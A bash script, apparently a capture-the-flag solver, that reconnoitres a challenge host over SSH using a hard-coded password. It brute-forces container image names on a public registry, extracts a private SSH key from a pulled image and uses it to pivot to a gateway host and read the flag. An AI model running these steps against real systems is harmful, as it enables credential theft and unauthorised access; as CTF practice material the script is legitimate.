#!/bin/bash
# FAST RECONNAISSANCE - Find the correct image name
# Run this in Kali: bash stolen_FAST_RECON.sh

INSTANCE_PORT="32881"
PASSWORD="reyalp"

echo "=== STOLEN SCHEMATICS - FAST RECON ==="
echo ""

echo "[*] Connecting to instance to find clues..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st << 'EOF'
echo "=== SYSTEM INFO ==="
hostname
whoami
id
echo ""

echo "=== NETWORK INFO ==="
ip addr
echo ""

echo "=== DOCKER INFO ==="
docker ps -a 2>/dev/null || echo "Docker not available"
echo ""

echo "=== ENVIRONMENT VARIABLES ==="
env | grep -i docker
env | grep -i image
env | grep -i ghcr
env | grep -i container
echo ""

echo "=== HOME DIRECTORY ==="
ls -la ~ 2>/dev/null
echo ""

echo "=== /TMP DIRECTORY ==="
ls -la /tmp 2>/dev/null
echo ""

echo "=== RUNNING PROCESSES ==="
ps aux | grep -i docker
ps aux | grep -i container
echo ""

echo "=== /ETC/HOSTS ==="
cat /etc/hosts 2>/dev/null
echo ""

echo "=== LOOKING FOR HINTS ==="
find / -name "*docker*" -o -name "*image*" -o -name "*container*" 2>/dev/null | head -20
echo ""

echo "=== CHECK FOR README OR HINTS ==="
cat /home/player/README* 2>/dev/null
cat /home/player/.ssh/README* 2>/dev/null
cat /tmp/README* 2>/dev/null
ls -la /home/player/ 2>/dev/null
echo ""

echo "=== CHECK CONTAINER METADATA ==="
cat /proc/1/cgroup 2>/dev/null | head -5
echo ""

echo "=== CHECK FOR SSH KEYS ALREADY PRESENT ==="
ls -la /home/player/.ssh/ 2>/dev/null
cat /home/player/.ssh/config 2>/dev/null
echo ""

echo "=== TRY TO ACCESS GATEWAY DIRECTLY ==="
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@172.27.0.1 "echo 'Direct access works!'" 2>&1 | head -3
echo ""

echo "=== CHECK DOCKER SOCKET ==="
ls -la /var/run/docker.sock 2>/dev/null
echo ""

exit
EOF

echo ""
echo "=== TRYING TO ENUMERATE GHCR.IO REPOSITORY ==="
echo "Attempting to list public images in talldwarfhosting org..."

# Try to use GitHub API to enumerate public packages
curl -s "https://api.github.com/orgs/talldwarfhosting/packages?package_type=container" 2>/dev/null | grep -E '"name"|"package_type"' | head -20

echo ""
echo "=== CHECKING GITHUB PROFILE ==="
curl -s "https://api.github.com/users/talldwarfhosting" 2>/dev/null | grep -E '"login"|"name"|"bio"|"public_repos"'

echo ""
echo "=== TRYING ALTERNATE IMAGE PATTERNS ==="
for name in mc-server minecraft-server game-server server mc minecraft game tdho-server tdho-mc ctf-server challenge-server stolen-schematics schematics; do
    for tag in latest v1 v0.1 v1.0 v2 v3 2024 2025 prod production dev; do
        echo "[*] Trying: ghcr.io/talldwarfhosting/$name:$tag"
        if timeout 5 docker pull ghcr.io/talldwarfhosting/$name:$tag 2>&1 | grep -q "Downloaded\|up to date"; then
            echo "✓✓✓ FOUND: ghcr.io/talldwarfhosting/$name:$tag ✓✓✓"
            export FOUND_IMAGE="ghcr.io/talldwarfhosting/$name:$tag"
            break 2
        fi
    done
done

if [ ! -z "$FOUND_IMAGE" ]; then
    echo ""
    echo "=== SUCCESS! Found image: $FOUND_IMAGE ==="
    echo "Now extracting SSH key..."
    docker run --rm $FOUND_IMAGE cat /root/.ssh/id_rsa > /tmp/stolen_key 2>/dev/null || \
    docker run --rm $FOUND_IMAGE cat /home/player/.ssh/id_rsa > /tmp/stolen_key 2>/dev/null
    
    if [ -s /tmp/stolen_key ]; then
        echo "✓ SSH key extracted!"
        chmod 600 /tmp/stolen_key
        echo "Now uploading to instance and getting flag..."
        sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no -P $INSTANCE_PORT /tmp/stolen_key player@instance.ctf.tdho.st:/tmp/key
        sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $INSTANCE_PORT player@instance.ctf.tdho.st 'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt || cat flag.txt || cat /flag.txt || find / -name flag.txt -type f 2>/dev/null | xargs cat"'
    fi
fi

echo ""
echo "=== RECON COMPLETE ==="
